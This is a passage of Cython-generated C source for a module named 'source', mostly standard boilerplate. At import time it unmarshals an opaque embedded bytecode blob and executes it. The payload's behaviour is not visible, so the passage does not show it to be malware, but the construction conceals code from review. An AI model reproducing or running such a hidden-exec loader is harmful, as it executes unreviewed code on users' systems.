\001\330\022\"\220(\324\022\"\321\022$\324\022$\210\007\330\r\024\217[\212[\230\021\211^\214^\210\002\330\017\021\214z\217~\212~\230k\321\017*\324\017*\210\004\330\010\r\370\360\002\001\005\r\330\010\014\210\004\370\370\370\360\021\010\001\r\360\024\000\006+\200\002\360\002.\001\016\360\000.\001\016\360\000.\001\016\360^\001\000\001\004\200\003\201\005\204\005\200\005\360\004 \001\021\360\000 \001\021\360\000 \001\021\360B\001\000\001\007\200\006\201\010\204\010\200\010\360\0044\001\016\360\0004\001\016\360\0004\001\016\360n\001?\001\016\360\000?\001\016\360\000?\001\016\360D\002\037\001\017\360\000\037\001\017\360\000\037\001\017\360F\001\037\001\013\360\000\037\001\013\360\000\037\001\013\360B\001\032\001\r\360\000\032\001\r\360\000\032\001\r\360:.\001\r\360\000.\001\r\360\000.\001\r\360`\001\023\001\022\360\000\023\001\022\360\000\023\001\022\360(\000\n\017\210""\025\210s\211\032\214\032\360\000\001\001\036\360\000\001\001\036\200A\330\004\n\200F\220\"\320\004\025\321\004\025\324\004\025\327\004\033\322\004\033\321\004\035\324\004\035\320\004\035\320\004\035\360\003\001\001\036\360\000\001\001\036sU\000\000\000\301.\001B9\003\3010/B \002\302\037\001B9\003\302 \007B*\005\302'\002B9\003\302)\001B*\005\302*\003B9\003\3029\004B=\007\303\000\001B=\007\303,\037D\027\003\304\027\004D\033\007\304\036\001D\033\007\315\026A\000N\027\000\316\027\002N\033\003";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l, __pyx_k_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l, sizeof(__pyx_k_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l), 0, 0, 0, 0},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
